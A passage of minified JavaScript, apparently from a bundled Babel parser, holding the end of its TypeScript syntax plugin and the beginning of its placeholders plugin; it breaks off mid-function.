Z=this.startNodeAt(W);if(Y.length)Z.decorators=Y;if(H)Z.accessibility=H;if($)Z.readonly=$;if(z)Z.override=z;if(K.type!=="Identifier"&&K.type!=="AssignmentPattern")this.raise(K1.UnsupportedParameterPropertyKind,Z);return Z.parameter=K,this.finishNode(Z,"TSParameterProperty")}if(Y.length)V.decorators=Y;return K}isSimpleParameter(Q){return Q.type==="TSParameterProperty"&&super.isSimpleParameter(Q.parameter)||super.isSimpleParameter(Q)}tsDisallowOptionalPattern(Q){for(let Y of Q.params)if(Y.type!=="Identifier"&&Y.optional&&!this.state.isAmbientContext)this.raise(K1.PatternIsOptional,Y)}setArrowFunctionParameters(Q,Y,W){super.setArrowFunctionParameters(Q,Y,W),this.tsDisallowOptionalPattern(Q)}parseFunctionBodyAndFinish(Q,Y,W=!1){if(this.match(14))Q.returnType=this.tsParseTypeOrTypePredicateAnnotation(14);let G=Y==="FunctionDeclaration"?"TSDeclareFunction":Y==="ClassMethod"||Y==="ClassPrivateMethod"?"TSDeclareMethod":void 0;if(G&&!this.match(5)&&this.isLineTerminator())return this.finishNode(Q,G);if(G==="TSDeclareFunction"&&this.state.isAmbientContext){if(this.raise(K1.DeclareFunctionHasImplementation,Q),Q.declare)return super.parseFunctionBodyAndFinish(Q,G,W)}return this.tsDisallowOptionalPattern(Q),super.parseFunctionBodyAndFinish(Q,Y,W)}registerFunctionStatementId(Q){if(!Q.body&&Q.id)this.checkIdentifier(Q.id,1024);else super.registerFunctionStatementId(Q)}tsCheckForInvalidTypeCasts(Q){Q.forEach((Y)=>{if((Y==null?void 0:Y.type)==="TSTypeCastExpression")this.raise(K1.UnexpectedTypeAnnotation,Y.typeAnnotation)})}toReferencedList(Q,Y){return this.tsCheckForInvalidTypeCasts(Q),Q}parseArrayLike(Q,Y,W,G){let H=super.parseArrayLike(Q,Y,W,G);if(H.type==="ArrayExpression")this.tsCheckForInvalidTypeCasts(H.elements);return H}parseSubscript(Q,Y,W,G){if(!this.hasPrecedingLineBreak()&&this.match(35)){this.state.canStartJSXElement=!1,this.next();let z=this.startNodeAt(Y);return z.expression=Q,this.finishNode(z,"TSNonNullExpression")}let H=!1;if(this.match(18)&&this.lookaheadCharCode()===60){if(W)return G.stop=!0,Q;G.optionalChainMember=H=!0,this.next()}if(this.match(47)||this.match(51)){let z,$=this.tsTryParseAndCatch(()=>{if(!W&&this.atPossibleAsyncArrow(Q)){let q=this.tsTryParseGenericAsyncArrowFunction(Y);if(q)return G.stop=!0,q}let V=this.tsParseTypeArgumentsInExpression();if(!V)return;if(H&&!this.match(10)){z=this.state.curPosition();return}if(f5(this.state.type)){let q=super.parseTaggedTemplateExpression(Q,Y,G);return q.typeParameters=V,q}if(!W&&this.eat(10)){let q=this.startNodeAt(Y);if(q.callee=Q,q.arguments=this.parseCallExpressionArguments(),this.tsCheckForInvalidTypeCasts(q.arguments),q.typeParameters=V,G.optionalChainMember)q.optional=H;return this.finishCallExpression(q,G.optionalChainMember)}let K=this.state.type;if(K===48||K===52||K!==10&&uJ(K)&&!this.hasPrecedingLineBreak())return;let Z=this.startNodeAt(Y);return Z.expression=Q,Z.typeParameters=V,this.finishNode(Z,"TSInstantiationExpression")});if(z)this.unexpected(z,10);if($){if($.type==="TSInstantiationExpression"){if(this.match(16)||this.match(18)&&this.lookaheadCharCode()!==40)this.raise(K1.InvalidPropertyAccessAfterInstantiationExpression,this.state.startLoc);if(!this.match(16)&&!this.match(18))$.expression=super.stopParseSubscript(Q,G)}return $}}return super.parseSubscript(Q,Y,W,G)}parseNewCallee(Q){var Y;super.parseNewCallee(Q);let{callee:W}=Q;if(W.type==="TSInstantiationExpression"&&!((Y=W.extra)!=null&&Y.parenthesized))Q.typeParameters=W.typeParameters,Q.callee=W.expression}parseExprOp(Q,Y,W){let G;if(b5(58)>W&&!this.hasPrecedingLineBreak()&&(this.isContextual(93)||(G=this.isContextual(120)))){let H=this.startNodeAt(Y);return H.expression=Q,H.typeAnnotation=this.tsInType(()=>{if(this.next(),this.match(75)){if(G)this.raise(S.UnexpectedKeyword,this.state.startLoc,{keyword:"const"});return this.tsParseTypeReference()}return this.tsParseType()}),this.finishNode(H,G?"TSSatisfiesExpression":"TSAsExpression"),this.reScan_lt_gt(),this.parseExprOp(H,Y,W)}return super.parseExprOp(Q,Y,W)}checkReservedWord(Q,Y,W,G){if(!this.state.isAmbientContext)super.checkReservedWord(Q,Y,W,G)}checkImportReflection(Q){if(super.checkImportReflection(Q),Q.module&&Q.importKind!=="value")this.raise(K1.ImportReflectionHasImportType,Q.specifiers[0].loc.start)}checkDuplicateExports(){}isPotentialImportPhase(Q){if(super.isPotentialImportPhase(Q))return!0;if(this.isContextual(130)){let Y=this.lookaheadCharCode();return Q?Y===123||Y===42:Y!==61}return!Q&&this.isContextual(87)}applyImportPhase(Q,Y,W,G){if(super.applyImportPhase(Q,Y,W,G),Y)Q.exportKind=W==="type"?"type":"value";else Q.importKind=W==="type"||W==="typeof"?W:"value"}parseImport(Q){if(this.match(134))return Q.importKind="value",super.parseImport(Q);let Y;if(W0(this.state.type)&&this.lookaheadCharCode()===61)return Q.importKind="value",this.tsParseImportEqualsDeclaration(Q);else if(this.isContextual(130)){let W=this.parseMaybeImportPhase(Q,!1);if(this.lookaheadCharCode()===61)return this.tsParseImportEqualsDeclaration(Q,W);else Y=super.parseImportSpecifiersAndAfter(Q,W)}else Y=super.parseImport(Q);if(Y.importKind==="type"&&Y.specifiers.length>1&&Y.specifiers[0].type==="ImportDefaultSpecifier")this.raise(K1.TypeImportCannotSpecifyDefaultAndNamed,Y);return Y}parseExport(Q,Y){if(this.match(83)){let W=Q;this.next();let G=null;if(this.isContextual(130)&&this.isPotentialImportPhase(!1))G=this.parseMaybeImportPhase(W,!1);else W.importKind="value";return this.tsParseImportEqualsDeclaration(W,G,!0)}else if(this.eat(29)){let W=Q;return W.expression=super.parseExpression(),this.semicolon(),this.sawUnambiguousESM=!0,this.finishNode(W,"TSExportAssignment")}else if(this.eatContextual(93)){let W=Q;return this.expectContextual(128),W.id=this.parseIdentifier(),this.semicolon(),this.finishNode(W,"TSNamespaceExportDeclaration")}else return super.parseExport(Q,Y)}isAbstractClass(){return this.isContextual(124)&&this.isLookaheadContextual("class")}parseExportDefaultExpression(){if(this.isAbstractClass()){let Q=this.startNode();return this.next(),Q.abstract=!0,this.parseClass(Q,!0,!0)}if(this.match(129)){let Q=this.tsParseInterfaceDeclaration(this.startNode());if(Q)return Q}return super.parseExportDefaultExpression()}parseVarStatement(Q,Y,W=!1){let{isAmbientContext:G}=this.state,H=super.parseVarStatement(Q,Y,W||G);if(!G)return H;if(!Q.declare&&(Y==="using"||Y==="await using"))return this.raiseOverwrite(K1.UsingDeclarationInAmbientContext,Q,Y),H;for(let{id:z,init:$}of H.declarations){if(!$)continue;if(Y==="var"||Y==="let"||!!z.typeAnnotation)this.raise(K1.InitializerNotAllowedInAmbientContext,$);else if(!MS($,this.hasPlugin("estree")))this.raise(K1.ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference,$)}return H}parseStatementContent(Q,Y){if(this.match(75)&&this.isLookaheadContextual("enum")){let W=this.startNode();return this.expect(75),this.tsParseEnumDeclaration(W,{const:!0})}if(this.isContextual(126))return this.tsParseEnumDeclaration(this.startNode());if(this.isContextual(129)){let W=this.tsParseInterfaceDeclaration(this.startNode());if(W)return W}return super.parseStatementContent(Q,Y)}parseAccessModifier(){return this.tsParseModifier(["public","protected","private"])}tsHasSomeModifiers(Q,Y){return Y.some((W)=>{if(v$(W))return Q.accessibility===W;return!!Q[W]})}tsIsStartOfStaticBlocks(){return this.isContextual(106)&&this.lookaheadCharCode()===123}parseClassMember(Q,Y,W){let G=["declare","private","public","protected","override","abstract","readonly","static"];this.tsParseModifiers({allowedModifiers:G,disallowedModifiers:["in","out"],stopOnStartOfClassStaticBlock:!0,errorTemplate:K1.InvalidModifierOnTypeParameterPositions},Y);let H=()=>{if(this.tsIsStartOfStaticBlocks()){if(this.next(),this.next(),this.tsHasSomeModifiers(Y,G))this.raise(K1.StaticBlockCannotHaveModifier,this.state.curPosition());super.parseClassStaticBlock(Q,Y)}else this.parseClassMemberWithIsStatic(Q,Y,W,!!Y.static)};if(Y.declare)this.tsInAmbientContext(H);else H()}parseClassMemberWithIsStatic(Q,Y,W,G){let H=this.tsTryParseIndexSignature(Y);if(H){if(Q.body.push(H),Y.abstract)this.raise(K1.IndexSignatureHasAbstract,Y);if(Y.accessibility)this.raise(K1.IndexSignatureHasAccessibility,Y,{modifier:Y.accessibility});if(Y.declare)this.raise(K1.IndexSignatureHasDeclare,Y);if(Y.override)this.raise(K1.IndexSignatureHasOverride,Y);return}if(!this.state.inAbstractClass&&Y.abstract)this.raise(K1.NonAbstractClassHasAbstractMethod,Y);if(Y.override){if(!W.hadSuperClass)this.raise(K1.OverrideNotInSubClass,Y)}super.parseClassMemberWithIsStatic(Q,Y,W,G)}parsePostMemberNameModifiers(Q){if(this.eat(17))Q.optional=!0;if(Q.readonly&&this.match(10))this.raise(K1.ClassMethodHasReadonly,Q);if(Q.declare&&this.match(10))this.raise(K1.ClassMethodHasDeclare,Q)}parseExpressionStatement(Q,Y,W){return(Y.type==="Identifier"?this.tsParseExpressionStatement(Q,Y,W):void 0)||super.parseExpressionStatement(Q,Y,W)}shouldParseExportDeclaration(){if(this.tsIsDeclarationStart())return!0;return super.shouldParseExportDeclaration()}parseConditional(Q,Y,W){if(!this.match(17))return Q;if(this.state.maybeInArrowParameters){let G=this.lookaheadCharCode();if(G===44||G===61||G===58||G===41)return this.setOptionalParametersError(W),Q}return super.parseConditional(Q,Y,W)}parseParenItem(Q,Y){let W=super.parseParenItem(Q,Y);if(this.eat(17))W.optional=!0,this.resetEndLocation(Q);if(this.match(14)){let G=this.startNodeAt(Y);return G.expression=Q,G.typeAnnotation=this.tsParseTypeAnnotation(),this.finishNode(G,"TSTypeCastExpression")}return Q}parseExportDeclaration(Q){if(!this.state.isAmbientContext&&this.isContextual(125))return this.tsInAmbientContext(()=>this.parseExportDeclaration(Q));let Y=this.state.startLoc,W=this.eatContextual(125);if(W&&(this.isContextual(125)||!this.shouldParseExportDeclaration()))throw this.raise(K1.ExpectedAmbientAfterExportDeclare,this.state.startLoc);let H=W0(this.state.type)&&this.tsTryParseExportDeclaration()||super.parseExportDeclaration(Q);if(!H)return null;if(H.type==="TSInterfaceDeclaration"||H.type==="TSTypeAliasDeclaration"||W)Q.exportKind="type";if(W&&H.type!=="TSImportEqualsDeclaration")this.resetStartLocation(H,Y),H.declare=!0;return H}parseClassId(Q,Y,W,G){if((!Y||W)&&this.isContextual(113))return;super.parseClassId(Q,Y,W,Q.declare?1024:8331);let H=this.tsTryParseTypeParameters(this.tsParseInOutConstModifiers);if(H)Q.typeParameters=H}parseClassPropertyAnnotation(Q){if(!Q.optional){if(this.eat(35))Q.definite=!0;else if(this.eat(17))Q.optional=!0}let Y=this.tsTryParseTypeAnnotation();if(Y)Q.typeAnnotation=Y}parseClassProperty(Q){if(this.parseClassPropertyAnnotation(Q),this.state.isAmbientContext&&!(Q.readonly&&!Q.typeAnnotation)&&this.match(29))this.raise(K1.DeclareClassFieldHasInitializer,this.state.startLoc);if(Q.abstract&&this.match(29)){let{key:Y}=Q;this.raise(K1.AbstractPropertyHasInitializer,this.state.startLoc,{propertyName:Y.type==="Identifier"&&!Q.computed?Y.name:`[${this.input.slice(this.offsetToSourcePos(Y.start),this.offsetToSourcePos(Y.end))}]`})}return super.parseClassProperty(Q)}parseClassPrivateProperty(Q){if(Q.abstract)this.raise(K1.PrivateElementHasAbstract,Q);if(Q.accessibility)this.raise(K1.PrivateElementHasAccessibility,Q,{modifier:Q.accessibility});return this.parseClassPropertyAnnotation(Q),super.parseClassPrivateProperty(Q)}parseClassAccessorProperty(Q){if(this.parseClassPropertyAnnotation(Q),Q.optional)this.raise(K1.AccessorCannotBeOptional,Q);return super.parseClassAccessorProperty(Q)}pushClassMethod(Q,Y,W,G,H,z){let $=this.tsTryParseTypeParameters(this.tsParseConstModifier);if($&&H)this.raise(K1.ConstructorHasTypeParameters,$);let{declare:V=!1,kind:K}=Y;if(V&&(K==="get"||K==="set"))this.raise(K1.DeclareAccessor,Y,{kind:K});if($)Y.typeParameters=$;super.pushClassMethod(Q,Y,W,G,H,z)}pushClassPrivateMethod(Q,Y,W,G){let H=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(H)Y.typeParameters=H;super.pushClassPrivateMethod(Q,Y,W,G)}declareClassPrivateMethodInScope(Q,Y){if(Q.type==="TSDeclareMethod")return;if(Q.type==="MethodDefinition"&&Q.value.body==null)return;super.declareClassPrivateMethodInScope(Q,Y)}parseClassSuper(Q){if(super.parseClassSuper(Q),Q.superClass&&(this.match(47)||this.match(51)))Q.superTypeParameters=this.tsParseTypeArgumentsInExpression();if(this.eatContextual(113))Q.implements=this.tsParseHeritageClause("implements")}parseObjPropValue(Q,Y,W,G,H,z,$){let V=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(V)Q.typeParameters=V;return super.parseObjPropValue(Q,Y,W,G,H,z,$)}parseFunctionParams(Q,Y){let W=this.tsTryParseTypeParameters(this.tsParseConstModifier);if(W)Q.typeParameters=W;super.parseFunctionParams(Q,Y)}parseVarId(Q,Y){if(super.parseVarId(Q,Y),Q.id.type==="Identifier"&&!this.hasPrecedingLineBreak()&&this.eat(35))Q.definite=!0;let W=this.tsTryParseTypeAnnotation();if(W)Q.id.typeAnnotation=W,this.resetEndLocation(Q.id)}parseAsyncArrowFromCallExpression(Q,Y){if(this.match(14))Q.returnType=this.tsParseTypeAnnotation();return super.parseAsyncArrowFromCallExpression(Q,Y)}parseMaybeAssign(Q,Y){var W,G,H,z,$;let V,K,Z;if(this.hasPlugin("jsx")&&(this.match(143)||this.match(47))){if(V=this.state.clone(),K=this.tryParse(()=>super.parseMaybeAssign(Q,Y),V),!K.error)return K.node;let{context:M}=this.state,O=M[M.length-1];if(O===e1.j_oTag||O===e1.j_expr)M.pop()}if(!((W=K)!=null&&W.error)&&!this.match(47))return super.parseMaybeAssign(Q,Y);if(!V||V===this.state)V=this.state.clone();let q,B=this.tryParse((M)=>{var O,R;q=this.tsParseTypeParameters(this.tsParseConstModifier);let I=super.parseMaybeAssign(Q,Y);if(I.type!=="ArrowFunctionExpression"||(O=I.extra)!=null&&O.parenthesized)M();if(((R=q)==null?void 0:R.params.length)!==0)this.resetStartLocationFromNode(I,q);return I.typeParameters=q,I},V);if(!B.error&&!B.aborted){if(q)this.reportReservedArrowTypeParam(q);return B.node}if(!K){if(b$(!this.hasPlugin("jsx")),Z=this.tryParse(()=>super.parseMaybeAssign(Q,Y),V),!Z.error)return Z.node}if((G=K)!=null&&G.node)return this.state=K.failState,K.node;if(B.node){if(this.state=B.failState,q)this.reportReservedArrowTypeParam(q);return B.node}if((H=Z)!=null&&H.node)return this.state=Z.failState,Z.node;throw((z=K)==null?void 0:z.error)||B.error||(($=Z)==null?void 0:$.error)}reportReservedArrowTypeParam(Q){var Y;if(Q.params.length===1&&!Q.params[0].constraint&&!((Y=Q.extra)!=null&&Y.trailingComma)&&this.getPluginOption("typescript","disallowAmbiguousJSXLike"))this.raise(K1.ReservedArrowTypeParam,Q)}parseMaybeUnary(Q,Y){if(!this.hasPlugin("jsx")&&this.match(47))return this.tsParseTypeAssertion();return super.parseMaybeUnary(Q,Y)}parseArrow(Q){if(this.match(14)){let Y=this.tryParse((W)=>{let G=this.tsParseTypeOrTypePredicateAnnotation(14);if(this.canInsertSemicolon()||!this.match(19))W();return G});if(Y.aborted)return;if(!Y.thrown){if(Y.error)this.state=Y.failState;Q.returnType=Y.node}}return super.parseArrow(Q)}parseFunctionParamType(Q){if(this.eat(17))Q.optional=!0;let Y=this.tsTryParseTypeAnnotation();if(Y)Q.typeAnnotation=Y;return this.resetEndLocation(Q),Q}isAssignable(Q,Y){switch(Q.type){case"TSTypeCastExpression":return this.isAssignable(Q.expression,Y);case"TSParameterProperty":return!0;default:return super.isAssignable(Q,Y)}}toAssignable(Q,Y=!1){switch(Q.type){case"ParenthesizedExpression":this.toAssignableParenthesizedExpression(Q,Y);break;case"TSAsExpression":case"TSSatisfiesExpression":case"TSNonNullExpression":case"TSTypeAssertion":if(Y)this.expressionScope.recordArrowParameterBindingError(K1.UnexpectedTypeCastInParameter,Q);else this.raise(K1.UnexpectedTypeCastInParameter,Q);this.toAssignable(Q.expression,Y);break;case"AssignmentExpression":if(!Y&&Q.left.type==="TSTypeCastExpression")Q.left=this.typeCastToParameter(Q.left);default:super.toAssignable(Q,Y)}}toAssignableParenthesizedExpression(Q,Y){switch(Q.expression.type){case"TSAsExpression":case"TSSatisfiesExpression":case"TSNonNullExpression":case"TSTypeAssertion":case"ParenthesizedExpression":this.toAssignable(Q.expression,Y);break;default:super.toAssignable(Q,Y)}}checkToRestConversion(Q,Y){switch(Q.type){case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":case"TSNonNullExpression":this.checkToRestConversion(Q.expression,!1);break;default:super.checkToRestConversion(Q,Y)}}isValidLVal(Q,Y,W){switch(Q){case"TSTypeCastExpression":return!0;case"TSParameterProperty":return"parameter";case"TSNonNullExpression":return"expression";case"TSAsExpression":case"TSSatisfiesExpression":case"TSTypeAssertion":return(W!==64||!Y)&&["expression",!0];default:return super.isValidLVal(Q,Y,W)}}parseBindingAtom(){if(this.state.type===78)return this.parseIdentifier(!0);return super.parseBindingAtom()}parseMaybeDecoratorArguments(Q,Y){if(this.match(47)||this.match(51)){let W=this.tsParseTypeArgumentsInExpression();if(this.match(10)){let G=super.parseMaybeDecoratorArguments(Q,Y);return G.typeParameters=W,G}this.unexpected(null,10)}return super.parseMaybeDecoratorArguments(Q,Y)}checkCommaAfterRest(Q){if(this.state.isAmbientContext&&this.match(12)&&this.lookaheadCharCode()===Q)return this.next(),!1;return super.checkCommaAfterRest(Q)}isClassMethod(){return this.match(47)||super.isClassMethod()}isClassProperty(){return this.match(35)||this.match(14)||super.isClassProperty()}parseMaybeDefault(Q,Y){let W=super.parseMaybeDefault(Q,Y);if(W.type==="AssignmentPattern"&&W.typeAnnotation&&W.right.start<W.typeAnnotation.start)this.raise(K1.TypeAnnotationAfterAssign,W.typeAnnotation);return W}getTokenFromCode(Q){if(this.state.inType){if(Q===62){this.finishOp(48,1);return}if(Q===60){this.finishOp(47,1);return}}super.getTokenFromCode(Q)}reScan_lt_gt(){let{type:Q}=this.state;if(Q===47)this.state.pos-=1,this.readToken_lt();else if(Q===48)this.state.pos-=1,this.readToken_gt()}reScan_lt(){let{type:Q}=this.state;if(Q===51)return this.state.pos-=2,this.finishOp(47,1),47;return Q}toAssignableListItem(Q,Y,W){let G=Q[Y];if(G.type==="TSTypeCastExpression")Q[Y]=this.typeCastToParameter(G);super.toAssignableListItem(Q,Y,W)}typeCastToParameter(Q){return Q.expression.typeAnnotation=Q.typeAnnotation,this.resetEndLocation(Q.expression,Q.typeAnnotation.loc.end),Q.expression}shouldParseArrow(Q){if(this.match(14))return Q.every((Y)=>this.isAssignable(Y,!0));return super.shouldParseArrow(Q)}shouldParseAsyncArrow(){return this.match(14)||super.shouldParseAsyncArrow()}canHaveLeadingDecorator(){return super.canHaveLeadingDecorator()||this.isAbstractClass()}jsxParseOpeningElementAfterName(Q){if(this.match(47)||this.match(51)){let Y=this.tsTryParseAndCatch(()=>this.tsParseTypeArgumentsInExpression());if(Y)Q.typeParameters=Y}return super.jsxParseOpeningElementAfterName(Q)}getGetterSetterExpectedParamCount(Q){let Y=super.getGetterSetterExpectedParamCount(Q),G=this.getObjectOrClassMethodParams(Q)[0];return G&&this.isThisParam(G)?Y+1:Y}parseCatchClauseParam(){let Q=super.parseCatchClauseParam(),Y=this.tsTryParseTypeAnnotation();if(Y)Q.typeAnnotation=Y,this.resetEndLocation(Q);return Q}tsInAmbientContext(Q){let{isAmbientContext:Y,strict:W}=this.state;this.state.isAmbientContext=!0,this.state.strict=!1;try{return Q()}finally{this.state.isAmbientContext=Y,this.state.strict=W}}parseClass(Q,Y,W){let G=this.state.inAbstractClass;this.state.inAbstractClass=!!Q.abstract;try{return super.parseClass(Q,Y,W)}finally{this.state.inAbstractClass=G}}tsParseAbstractDeclaration(Q,Y){if(this.match(80))return Q.abstract=!0,this.maybeTakeDecorators(Y,this.parseClass(Q,!0,!1));else if(this.isContextual(129)){if(!this.hasFollowingLineBreak())return Q.abstract=!0,this.raise(K1.NonClassMethodPropertyHasAbstractModifier,Q),this.tsParseInterfaceDeclaration(Q)}else this.unexpected(null,80)}parseMethod(Q,Y,W,G,H,z,$){let V=super.parseMethod(Q,Y,W,G,H,z,$);if(V.abstract||V.type==="TSAbstractMethodDefinition"){if((this.hasPlugin("estree")?V.value:V).body){let{key:q}=V;this.raise(K1.AbstractMethodHasImplementation,V,{methodName:q.type==="Identifier"&&!V.computed?q.name:`[${this.input.slice(this.offsetToSourcePos(q.start),this.offsetToSourcePos(q.end))}]`})}}return V}tsParseTypeParameterName(){return this.parseIdentifier().name}shouldParseAsAmbientContext(){return!!this.getPluginOption("typescript","dts")}parse(){if(this.shouldParseAsAmbientContext())this.state.isAmbientContext=!0;return super.parse()}getExpression(){if(this.shouldParseAsAmbientContext())this.state.isAmbientContext=!0;return super.getExpression()}parseExportSpecifier(Q,Y,W,G){if(!Y&&G)return this.parseTypeOnlyImportExportSpecifier(Q,!1,W),this.finishNode(Q,"ExportSpecifier");return Q.exportKind="value",super.parseExportSpecifier(Q,Y,W,G)}parseImportSpecifier(Q,Y,W,G,H){if(!Y&&G)return this.parseTypeOnlyImportExportSpecifier(Q,!0,W),this.finishNode(Q,"ImportSpecifier");return Q.importKind="value",super.parseImportSpecifier(Q,Y,W,G,W?4098:4096)}parseTypeOnlyImportExportSpecifier(Q,Y,W){let G=Y?"imported":"local",H=Y?"local":"exported",z=Q[G],$,V=!1,K=!0,Z=z.loc.start;if(this.isContextual(93)){let B=this.parseIdentifier();if(this.isContextual(93)){let M=this.parseIdentifier();if(u9(this.state.type))V=!0,z=B,$=Y?this.parseIdentifier():this.parseModuleExportName(),K=!1;else $=M,K=!1}else if(u9(this.state.type))K=!1,$=Y?this.parseIdentifier():this.parseModuleExportName();else V=!0,z=B}else if(u9(this.state.type))if(V=!0,Y){if(z=this.parseIdentifier(!0),!this.isContextual(93))this.checkReservedWord(z.name,z.loc.start,!0,!0)}else z=this.parseModuleExportName();if(V&&W)this.raise(Y?K1.TypeModifierIsUsedInTypeImports:K1.TypeModifierIsUsedInTypeExports,Z);Q[G]=z,Q[H]=$;let q=Y?"importKind":"exportKind";if(Q[q]=V?"type":"value",K&&this.eatContextual(93))Q[H]=Y?this.parseIdentifier():this.parseModuleExportName();if(!Q[H])Q[H]=this.cloneIdentifier(Q[G]);if(Y)this.checkIdentifier(Q[H],V?4098:4096)}fillOptionalPropertiesForTSESLint(Q){var Y,W,G,H,z,$,V,K,Z,q,B,M,O,R,I,F,T,b,h,L,N,k,_,c,a,J1,q1,_1,M1,k1,r,y,m,W1,F1,f1,b1,p1,X0,m1,C1,J0,o1,v1,i,L1;switch(Q.type){case"ExpressionStatement":(Y=Q.directive)!=null||(Q.directive=void 0);return;case"RestElement":Q.value=void 0;case"Identifier":case"ArrayPattern":case"AssignmentPattern":case"ObjectPattern":(W=Q.decorators)!=null||(Q.decorators=[]),(G=Q.optional)!=null||(Q.optional=!1),(H=Q.typeAnnotation)!=null||(Q.typeAnnotation=void 0);return;case"TSParameterProperty":(z=Q.accessibility)!=null||(Q.accessibility=void 0),($=Q.decorators)!=null||(Q.decorators=[]),(V=Q.override)!=null||(Q.override=!1),(K=Q.readonly)!=null||(Q.readonly=!1),(Z=Q.static)!=null||(Q.static=!1);return;case"TSEmptyBodyFunctionExpression":Q.body=null;case"TSDeclareFunction":case"FunctionDeclaration":case"FunctionExpression":case"ClassMethod":case"ClassPrivateMethod":(q=Q.declare)!=null||(Q.declare=!1),(B=Q.returnType)!=null||(Q.returnType=void 0),(M=Q.typeParameters)!=null||(Q.typeParameters=void 0);return;case"Property":(O=Q.optional)!=null||(Q.optional=!1);return;case"TSMethodSignature":case"TSPropertySignature":(R=Q.optional)!=null||(Q.optional=!1);case"TSIndexSignature":(I=Q.accessibility)!=null||(Q.accessibility=void 0),(F=Q.readonly)!=null||(Q.readonly=!1),(T=Q.static)!=null||(Q.static=!1);return;case"TSAbstractPropertyDefinition":case"PropertyDefinition":case"TSAbstractAccessorProperty":case"AccessorProperty":(b=Q.declare)!=null||(Q.declare=!1),(h=Q.definite)!=null||(Q.definite=!1),(L=Q.readonly)!=null||(Q.readonly=!1),(N=Q.typeAnnotation)!=null||(Q.typeAnnotation=void 0);case"TSAbstractMethodDefinition":case"MethodDefinition":(k=Q.accessibility)!=null||(Q.accessibility=void 0),(_=Q.decorators)!=null||(Q.decorators=[]),(c=Q.override)!=null||(Q.override=!1),(a=Q.optional)!=null||(Q.optional=!1);return;case"ClassExpression":(J1=Q.id)!=null||(Q.id=null);case"ClassDeclaration":(q1=Q.abstract)!=null||(Q.abstract=!1),(_1=Q.declare)!=null||(Q.declare=!1),(M1=Q.decorators)!=null||(Q.decorators=[]),(k1=Q.implements)!=null||(Q.implements=[]),(r=Q.superTypeArguments)!=null||(Q.superTypeArguments=void 0),(y=Q.typeParameters)!=null||(Q.typeParameters=void 0);return;case"TSTypeAliasDeclaration":case"VariableDeclaration":(m=Q.declare)!=null||(Q.declare=!1);return;case"VariableDeclarator":(W1=Q.definite)!=null||(Q.definite=!1);return;case"TSEnumDeclaration":(F1=Q.const)!=null||(Q.const=!1),(f1=Q.declare)!=null||(Q.declare=!1);return;case"TSEnumMember":(b1=Q.computed)!=null||(Q.computed=!1);return;case"TSImportType":(p1=Q.qualifier)!=null||(Q.qualifier=null),(X0=Q.options)!=null||(Q.options=null);return;case"TSInterfaceDeclaration":(m1=Q.declare)!=null||(Q.declare=!1),(C1=Q.extends)!=null||(Q.extends=[]);return;case"TSModuleDeclaration":(J0=Q.declare)!=null||(Q.declare=!1),(o1=Q.global)!=null||(Q.global=Q.kind==="global");return;case"TSTypeParameter":(v1=Q.const)!=null||(Q.const=!1),(i=Q.in)!=null||(Q.in=!1),(L1=Q.out)!=null||(Q.out=!1);return}}};function BS(X){if(X.type!=="MemberExpression")return!1;let{computed:J,property:Q}=X;if(J&&Q.type!=="StringLiteral"&&(Q.type!=="TemplateLiteral"||Q.expressions.length>0))return!1;return ZV(X.object)}function MS(X,J){var Q;let{type:Y}=X;if((Q=X.extra)!=null&&Q.parenthesized)return!1;if(J){if(Y==="Literal"){let{value:W}=X;if(typeof W==="string"||typeof W==="boolean")return!0}}else if(Y==="StringLiteral"||Y==="BooleanLiteral")return!0;if(UV(X,J)||jS(X,J))return!0;if(Y==="TemplateLiteral"&&X.expressions.length===0)return!0;if(BS(X))return!0;return!1}function UV(X,J){if(J)return X.type==="Literal"&&(typeof X.value==="number"||("bigint"in X));return X.type==="NumericLiteral"||X.type==="BigIntLiteral"}function jS(X,J){if(X.type==="UnaryExpression"){let{operator:Q,argument:Y}=X;if(Q==="-"&&UV(Y,J))return!0}return!1}function ZV(X){if(X.type==="Identifier")return!0;if(X.type!=="MemberExpression"||X.computed)return!1;return ZV(X.object)}var f$=G6`placeholders`({ClassNameIsRequired:"A class name is required.",UnexpectedSpace:"Unexpected space in placeholder."}),OS=(X)=>class extends X{parsePlaceholder(Q){if(this.match(133)){let Y=this.startNode();return this.next(),this.assertNoSpace(),Y.name=super.parseIdentifier(!0),this.assertNoSpace(),this.expect(133),this.finishPlaceholder(Y,Q)}}finishPlaceholder(Q,Y){let W=Q;if(!W.expectedNode||!W.type)W=this.finishNode(W,"Placeholder");return W.expectedNode=Y,W}getTokenFromCode(Q){if(Q===37&&this.input.charCodeAt(this.state.pos+1)===37)this.finishOp(133,2);else super.getTokenFromCode(Q)}parseExprAtom(Q){return this.parsePlaceholder("Expression")||super.parseExprAtom(Q)}parseIdentifier(Q){return this.parsePlaceholder("Identifier")||super.parseIdentifier(Q)}checkReservedWord(Q,Y,W,G){if(Q!==void 0)super.checkReservedWord(Q,Y,W,G)}cloneIdentifier(Q){let Y=super.cloneIdentifier(Q);if(Y.type==="Placeholder")Y.expectedNode=Q.expectedNode;return Y}cloneStringLiteral(Q){if(Q.type==="Placeholder")return this.cloneIdentifier(Q);return super.cloneStringLiteral(Q)}parseBindingAtom(){return this.parsePlaceholder("Pattern")||super.parseBindingAtom()}isValidLVal(Q,Y,W){return Q==="Placeholder"||super.isValidLVal(Q,Y,W)}toAssignable(Q,Y){if(Q&&Q.type==="Placeholder"&&Q.expectedNode==="Expression")Q.expectedNode="Pattern";else super.toAssignable(Q,Y)}chStartsBindingIdentifier(Q,Y){if(super.chStartsBindingIdentifier(Q,Y))return!0;let W=this.nextTokenStart();if(this.input.charCodeAt(W)===37&&this.input.charCodeAt(W+1)===37)return!0;return!1}verifyBreakContinue(Q,Y){if(Q.label&&Q.label.type==="Placeholder")return;super.verifyBreakContinue(Q,Y)}parseExpressionStatement(Q,Y){var W;if(Y.type!=="Placeholder"||(W=Y.extra)!=null&&W.parenthesized)return super.parseExpressionStatement(Q,Y);if(this.match(14)){let H=Q;return H.label=this.finishPlaceholder(Y,"Identifier"),this.next(),H.body=super.parseStatementOrSloppyAnnexBFunctionDeclaration(),this.finishNode(H,"LabeledStatement")}this.semicolon();let G=Q;return G.name=Y.name,this.finishPlaceholder(G,"Statement")}parseBlock(Q,Y,W){return this.parsePlaceholder("BlockStatement")||super.parseBlock(Q,Y,W)}parseFunctionId(Q){return this.parsePlaceholder("Identifier")||super.parseFunctionId(Q)}parseClass(Q,Y,W){let 